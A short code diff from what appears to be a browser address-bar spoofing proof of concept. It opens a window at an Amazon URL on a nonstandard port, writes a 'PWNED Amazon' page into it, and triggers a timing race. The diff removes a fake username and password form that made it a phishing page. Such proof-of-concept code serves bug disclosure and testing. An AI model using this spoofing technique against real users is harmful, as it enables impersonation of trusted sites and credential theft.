@@ -22,10 +22,7 @@
     function startSpoof() {
 
       windowSpoof = window.open("https://amazon.com:83/","x");
-      windowSpoof.document.write(`<h1>PWNED Amazon</h1>
-<input type="text" placeholder="Username" id="username"><br>
-<input type="password" placeholder="Password" id="password"><br>
-<button action="#" method="post">Click me</button>`);
+      windowSpoof.document.write('<h1>PWNED Amazon</h1>');
 
       setInterval('race()', 0);
     
